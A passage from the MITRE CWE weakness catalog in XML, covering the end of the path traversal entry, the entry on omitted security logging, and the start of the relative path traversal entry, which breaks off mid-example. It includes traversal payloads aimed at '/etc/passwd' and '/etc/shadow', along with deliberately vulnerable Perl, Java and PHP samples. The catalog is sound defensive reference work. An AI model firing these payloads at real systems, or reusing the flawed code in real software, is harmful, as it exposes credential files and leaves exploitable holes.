            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>FIO02-C</Entry_ID>
               <Entry_Name>Canonicalize path names originating from untrusted sources</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="SEI CERT Perl Coding Standard">
               <Entry_ID>IDS00-PL</Entry_ID>
               <Entry_Name>Canonicalize path names before validating them</Entry_Name>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>33</Entry_ID>
               <Entry_Name>Path Traversal</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP16</Entry_ID>
               <Entry_Name>Path Traversal</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OMG ASCSM">
                <Entry_ID>ASCSM-CWE-22</Entry_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="126"/>
            <Related_Attack_Pattern CAPEC_ID="64"/>
            <Related_Attack_Pattern CAPEC_ID="76"/>
            <Related_Attack_Pattern CAPEC_ID="78"/>
            <Related_Attack_Pattern CAPEC_ID="79"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-7" Section="Chapter 11, &#34;Directory Traversal and Using Parent Paths (..)&#34; Page 370"/>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-185"/>
            <Reference External_Reference_ID="REF-186"/>
            <Reference External_Reference_ID="REF-76"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 9, &#34;Filenames and Paths&#34;, Page 503"/>
            <Reference External_Reference_ID="REF-962" Section="ASCSM-CWE-22"/>
         </References>
         <Notes>
            <Note Type="Relationship">Pathname equivalence can be regarded as a type of canonicalization error.</Note>
            <Note Type="Relationship">Some pathname equivalence issues are not directly related to directory traversal, rather are used to bypass security-relevant checks for whether a file/directory can be accessed by the attacker (e.g. a trailing "/" on a filename could bypass access rules that don't expect a trailing /, causing a server to provide the file when it normally would not).</Note>
            <Note Type="Terminology">
               <xhtml:p>Like other weaknesses, terminology is often based on the types of manipulations used, instead of the underlying weaknesses. Some people use "directory traversal" only to refer to the injection of ".." and equivalent sequences whose specific meaning is to traverse directories.</xhtml:p>
               <xhtml:p>Other variants like "absolute pathname" and "drive letter" have the *effect* of directory traversal, but some people may not call it such, since it doesn't involve ".." or equivalent.</xhtml:p>
            </Note>
            <Note Type="Research Gap">Many variants of path traversal attacks are probably under-studied with respect to root cause. CWE-790 and CWE-182 begin to cover part of this gap.</Note>
            <Note Type="Research Gap">
               <xhtml:p>Incomplete diagnosis or reporting of vulnerabilities can make it difficult to know which variant is affected. For example, a researcher might say that "..\" is vulnerable, but not test "../" which may also be vulnerable.</xhtml:p>
               <xhtml:p>Any combination of directory separators ("/", "\", etc.) and numbers of "." (e.g. "....") can produce unique variants; for example, the "//../" variant is not listed (CVE-2004-0325). See this entry's children and lower-level descendants.</xhtml:p>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Relationships, Other_Notes, Relationship_Notes, Relevant_Properties, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Description, Detection_Factors, Likelihood_of_Exploit, Name, Observed_Examples, Other_Notes, Potential_Mitigations, References, Related_Attack_Patterns, Relationship_Notes, Relationships, Research_Gaps, Taxonomy_Mappings, Terminology_Notes, Time_of_Introduction, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Description, Detection_Factors, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Other_Notes, Research_Gaps</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Affected_Resources, Causal_Nature, Likelihood_of_Exploit, References, Relationships, Relevant_Properties, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Common_Consequences, Description, Detection_Factors</Modification_Comment>
				</Modification>
				<Contribution Type="Feedback">
				  <Contribution_Name>Nick Johnston</Contribution_Name>
				  <Contribution_Date>2022-07-11</Contribution_Date>
				  <Contribution_Comment>Identified weakness in Perl demonstrative example</Contribution_Comment>
				</Contribution>
            <Previous_Entry_Name Date="2010-02-16">Path Traversal</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="223" Name="Omission of Security-relevant Information" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product does not record or display information that would be important for identifying the source or nature of an attack, or determining if an action is safe.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="221" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Non-Repudiation</Scope>
               <Impact>Hide Activities</Impact>
               <Note>The source of an attack will be difficult or impossible to determine. This can allow attacks to the system to continue without notice.</Note>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This code logs suspicious multiple login attempts.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>function login($userName,$password){<xhtml:div style="margin-left:1em;">
                        <xhtml:div>if(authenticate($userName,$password)){<xhtml:div style="margin-left:1em;">return True;</xhtml:div>}<xhtml:br/>else{<xhtml:div style="margin-left:1em;">incrementLoginAttempts($userName);<xhtml:br/>if(recentLoginAttempts($userName) &gt; 5){<xhtml:div style="margin-left:1em;">writeLog("Failed login attempt by User: " . $userName . " at " + date('r') );</xhtml:div>}</xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This code only logs failed login attempts when a certain limit is reached. If an attacker knows this limit, they can stop their attack from being discovered by avoiding the limit.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-1999-1029</Reference>
               <Description>Login attempts not recorded if user disconnects before maximum number of tries.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-1999-1029</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1839</Reference>
               <Description>Sender's IP address not recorded in outgoing e-mail.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1839</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0542</Reference>
               <Description>Failed authentication attempt not recorded if later attempt succeeds.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-0542</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Omission of Security-relevant Information</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Accountability&#34;, Page 40"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="23" Name="Relative Path Traversal" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize sequences such as ".." that can resolve to a location that is outside of that directory.</Description>
         <Extended_Description>This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="22" View_ID="1000" Ordinal="Primary"/>
             <Related_Weakness Nature="ChildOf" CWE_ID="22" View_ID="1305" Ordinal="Primary"/>
			 <Related_Weakness Nature="ChildOf" CWE_ID="22" View_ID="1340" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Zip Slip</Term>
               <Description>"Zip slip" is an attack that uses file archives (e.g., ZIP, tar, rar, etc.) that contain filenames with path traversal sequences that cause the files to be written outside of the directory under which the archive is expected to be extracted [REF-1282]. It is most commonly used for relative path traversal (CWE-23) and link following (CWE-59).</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>The attacker may be able to create or overwrite critical files that are used to execute code, such as programs or libraries.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Files or Directories</Impact>
               <Note>The attacker may be able to overwrite or create critical files, such as programs, libraries, or important data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, appending a new account at the end of a password file may allow an attacker to bypass authentication.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Files or Directories</Impact>
               <Note>The attacker may be able read the contents of unexpected files and expose sensitive data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, by reading a password file, the attacker could conduct brute force password guessing attacks in order to break into an account on the system.</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Note>The attacker may be able to overwrite, delete, or corrupt unexpected critical files such as programs, libraries, or important data. This may prevent the product from working at all and in the case of a protection mechanisms such as authentication, it has the potential to lockout every user of the product.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-5.1">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434.</xhtml:p>
                  <xhtml:p>Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-20.1">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.</xhtml:p>
                  <xhtml:p>Use a built-in path canonicalization function (such as realpath() in C) that produces the canonical version of the pathname, which effectively removes ".." sequences and symbolic links (CWE-23, CWE-59). This includes:</xhtml:p>
                     <xhtml:ul>
                        <xhtml:li>realpath() in C</xhtml:li>
                        <xhtml:li>getCanonicalPath() in Java</xhtml:li>
                        <xhtml:li>GetFullPath() in ASP.NET</xhtml:li>
                        <xhtml:li>realpath() or abs_path() in Perl</xhtml:li>
                        <xhtml:li>realpath() in PHP</xhtml:li>
                     </xhtml:ul>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following URLs are vulnerable to this attack:</Intro_Text>
               <Example_Code Nature="Bad">
                  <xhtml:div>http://example.com.br/get-files.jsp?file=report.pdf<xhtml:br/>http://example.com.br/get-page.php?home=aaa.html<xhtml:br/>http://example.com.br/some-page.asp?page=index.html</xhtml:div>
               </Example_Code>
               <Body_Text>A simple way to execute this attack is like this:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>http://example.com.br/get-files?file=../../../../somedir/somefile<xhtml:br/>http://example.com.br/../../../../etc/shadow<xhtml:br/>http://example.com.br/get-files?file=../../../../etc/passwd</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-27">
               <Intro_Text>The following code could be for a social networking application in which each user's profile information is stored in a separate file. All files are stored in a single directory.</Intro_Text>
               <Example_Code Nature="Bad" Language="Perl">
                  <xhtml:div>my $dataPath = "/users/cwe/profiles";<xhtml:br/>my $username = param("user");<xhtml:br/>my $profilePath = $dataPath . "/" . $username;<xhtml:br/>
                     <xhtml:br/>open(my $fh, "&lt;", $profilePath) || ExitError("profile read error: $profilePath");<xhtml:br/>print "&lt;ul&gt;\n";<xhtml:br/>while (&lt;$fh&gt;) {<xhtml:div style="margin-left:1em;">print "&lt;li&gt;$_&lt;/li&gt;\n";</xhtml:div>}<xhtml:br/>print "&lt;/ul&gt;\n";</xhtml:div>
               </Example_Code>
               <Body_Text>While the programmer intends to access files such as "/users/cwe/profiles/alice" or "/users/cwe/profiles/bob", there is no verification of the incoming user parameter. An attacker could provide a string such as:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>../../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>The program would generate a profile pathname like this:</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>/users/cwe/profiles/../../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>When the file is opened, the operating system resolves the "../" during path canonicalization and actually accesses this file:</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>/etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>As a result, the attacker could read the entire text of the password file.</Body_Text>
               <Body_Text>Notice how this code also contains an error message information leak (CWE-209) if the user parameter does not produce a file that exists: the full pathname is provided. Because of the lack of output encoding of the file that is retrieved, there might also be a cross-site scripting problem (CWE-79) if profile contains any HTML, but other code would need to be examined.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-22">
               <Intro_Text>The following code demonstrates the unrestricted upload of a file with a Java servlet and a path traversal vulnerability. The action attribute of an HTML form is sending the upload file request to the Java servlet.</Intro_Text>
               <Example_Code Nature="Good" Language="HTML">
                  <xhtml:div>&lt;form action="FileUploadServlet" method="post" enctype="multipart/form-data"&gt;<xhtml:br/>
                     <xhtml:br/>Choose a file to upload:<xhtml:br/>&lt;input type="file" name="filename"/&gt;<xhtml:br/>&lt;br/&gt;<xhtml:br/>&lt;input type="submit" name="submit" value="Submit"/&gt;<xhtml:br/>
                     <xhtml:br/>&lt;/form&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>When submitted the Java servlet's doPost method will receive the request, extract the name of the file from the Http request header, read the file contents from the request and output the file to the local upload directory.</Body_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public class FileUploadServlet extends HttpServlet {<xhtml:br/>
                     <xhtml:div style="margin-left:1em;">
                        <xhtml:div>...<xhtml:br/>
                           <xhtml:br/>protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {<xhtml:br/>
                           <xhtml:div style="margin-left:1em;">
                              <xhtml:div>response.setContentType("text/html");<xhtml:br/>PrintWriter out = response.getWriter();<xhtml:br/>String contentType = request.getContentType();<xhtml:br/>
                                 <xhtml:br/>// the starting position of the boundary header<xhtml:br/>int ind = contentType.indexOf("boundary=");<xhtml:br/>String boundary = contentType.substring(ind+9);<xhtml:br/>
                                 <xhtml:br/>String pLine = new String();<xhtml:br/>String uploadLocation = new String(UPLOAD_DIRECTORY_STRING); //Constant value<xhtml:br/>
                                 <xhtml:br/>// verify that content type is multipart form data<xhtml:br/>if (contentType != null &amp;&amp; contentType.indexOf("multipart/form-data") != -1) {<xhtml:br/>
                                 <xhtml:div style="margin-left:1em;">
                                    <xhtml:div>// extract the filename from the Http header<xhtml:br/>BufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));<xhtml:br/>...<xhtml:br/>pLine = br.readLine();<xhtml:br/>String filename = pLine.substring(pLine.lastIndexOf("\\"), pLine.lastIndexOf("\""));<xhtml:br/>...<xhtml:br/>
                                       <xhtml:br/>// output the file to the local upload directory<xhtml:br/>try {<xhtml:div style="margin-left:1em;">
                                          <xhtml:div>BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));<xhtml:br/>for (String line; (line=br.readLine())!=null; ) {<xhtml:div style="margin-left:1em;">if (line.indexOf(boundary) == -1) {<xhtml:div style="margin-left:1em;">bw.write(line);<xhtml:br/>bw.newLine();<xhtml:br/>bw.flush();</xhtml:div>}</xhtml:div>} //end of for loop<xhtml:br/>bw.close();</xhtml:div>
                                       </xhtml:div>
                                       <xhtml:br/>
                                       <xhtml:br/>} catch (IOException ex) {...}<xhtml:br/>// output successful upload response HTML page</xhtml:div>
                                 </xhtml:div>}<xhtml:br/>// output unsuccessful upload response HTML page<xhtml:br/>else<xhtml:br/>{...}</xhtml:div>
                           </xhtml:div>}<xhtml:div style="margin-left:1em;">...</xhtml:div>
                        </xhtml:div>
